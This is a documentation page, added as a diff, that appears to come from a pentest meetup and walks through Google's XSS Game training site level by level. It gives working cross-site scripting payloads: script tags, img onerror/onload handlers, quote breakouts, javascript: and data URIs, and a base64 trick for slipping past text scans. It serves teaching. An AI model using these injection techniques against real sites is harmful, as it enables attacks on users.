@@ -1,0 +1,100 @@
+.. include:: /pentest_links.txt
+
+.. _XSSGame:
+
+*****************
+Google's XSS Game
+*****************
+
+This is to document the meetup’s efforts responding to the challenge `XSS game <https://xss-game.appspot.com/>`_. Try the exercises yourself before getting the answers below.
+
+There is no VM setup required as the exploit is available online via Google App Engine, the same site hosting the content you are currently reading. Both sites are based on using the Python back end, which is why you'll see some target code in python.
+
+Note that this is one exercise requiring a browser because a client-side javascript ``alert()`` is required, rendering our usual command line tools (``curl`` et. al.) ineffective.
+
+For an introduction to XSS see :ref:`XSS_Tutorial`.
+
+Level 1
+=======
+
+Enter ``<script>alert("boo")</script>`` in the form. Alternatively, you can enter the unescaped url
+
+  ``https://xss-game.appspot.com/level1/frame?query=<script>alert("boo")</script>``
+
+or escape the query part of the url by replacing that with
+
+  ``?query=%3Cscript%3Ealert%28%22boo%22%29%3C%2Fscript%3E``.
+
+Any of these will submit an HTTP GET with the returned page having ``<script>alert("boo")</script>`` in the html body for execution.
+
+Note that the browser will encode the GET for you, but should you want to do that yourself you can use one of the many urlencode web sites or in python:
+
+.. code-block:: python
+
+   python -c 'import urllib; \
+   name = "query"; value = "<script>alert(\"boo\")</script>"; 
+   print(urllib.urlencode( {name : value} ));'
+
+Level 2
+=======
+
+Enter ``<img src="a b" onerror="alert('boo')" />`` in the form (a non-existing image trips ``onerror``), or ``<img src="/static/logos/level1.png" onload="alert('boo')"`` (an existing image trips ``onload``).
+
+This one is quite different: there is one initial HTTP GET request, then clicking ``Clear all posts`` or ``Share status!`` is handled on the client side via DOM innerHTML manipulation (no HTTP GET or POST is involved).
+
+You may have tried inserting ``<script>`` tags like the previous level, but that is doomed to failure in HTML5 compliant browsers. From `Element.innerHTML - Security considerations <https://developer.mozilla.org/en-US/docs/Web/API/Element.innerHTML#Security_considerations>`_:
+
+  HTML5 specifies that a <script> tag inserted via innerHTML should not execute.
+
+  However, there are ways to execute JavaScript without using <script> elements, so there is still a security risk whenever you use innerHTML to set strings over which you have no control. For example:
+
+  .. code-block:: javascript
+
+    var name = "<img src=x onerror=alert(1)>";
+    el.innerHTML = name; // shows the alert
+
+  For that reason, it is recommended you not use innerHTML when inserting plain text; instead, use node.textContent. This doesn't interpret the passed content as HTML, but instead inserts it as raw text.
+
+Despite what this says, from `Why are scripts injected through innerHTML not executed whilst onerror and other on<event> attributes on elements are? - Google XSS Challenge 2 <https://security.stackexchange.com/questions/60861/why-are-scripts-injected-through-innerhtml-not-executed-whilst-onerror-and-other>`_:
+
+  Script tags with a defer attribute will not be executed (on some browsers) until the DOM has been fully rendered. For instance, I tried the same challenge on IE and I was able to alert a popup using the following user input:
+
+  .. code-block:: html
+
+    <script defer>alert(2)</script>
+
+
+Level 3
+=======
+
+Enter ``https://xss-game.appspot.com/level3/frame#x' onerror='alert("boo")'``, or ``https://xss-game.appspot.com/level3/frame#1.jpg' onload='alert("boo")'`` repeating the idea of the prior level using onerror/onload.
+
+Of course you could use a ``<script>`` successfully via ``https://xss-game.appspot.com/level3/frame#1.jpg' \> <script>alert("boo")</script> <div`` since you're forcing an HTTP GET.
+
+
+Level 4
+=======
+
+Enter ``3');alert('boo``. You're just concatenating the alert to the already-existing ``onload`` javascript in an ``<img>`` tag.
+
+
+Level 5
+=======
+
+Enter ``https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert("boo")`` then click the ``Next >>`` link (which is the required alert).
+
+
+Level 6
+=======
+
+Enter ``https://xss-game.appspot.com/level6/frame#data:text/javascript,alert("boo")``. This is an example of using a `Data URI scheme <https://en.wikipedia.org/wiki/Data_URI_scheme>`_:
+
+  ``data:[<MIME-type>][;charset=<encoding>][;base64],<data>``
+
+To use base64 encoding change the URIs ``#data:...`` to:
+
+  ``#data:text/plain;base64,YWxlcnQoImJvbyIp``
+
+making it difficult for simple text scans to find the base64-encoded ``alert("boo")``.
+
+Also see `hacktracking # XSS game area <http://hacktracking.blogspot.com/2014_05_01_archive.html>`_ for some additional ideas beyond ``alert("boo")``.
